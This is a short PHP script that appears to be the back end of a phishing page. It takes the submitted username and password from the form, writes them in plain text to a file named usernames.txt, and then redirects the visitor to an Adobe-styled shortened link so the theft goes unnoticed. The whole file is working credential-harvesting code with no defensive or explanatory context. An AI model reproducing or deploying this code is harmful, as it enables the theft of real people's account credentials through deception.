<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . "\nPass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://adobe.ly/2OE9ZKL');
exit();
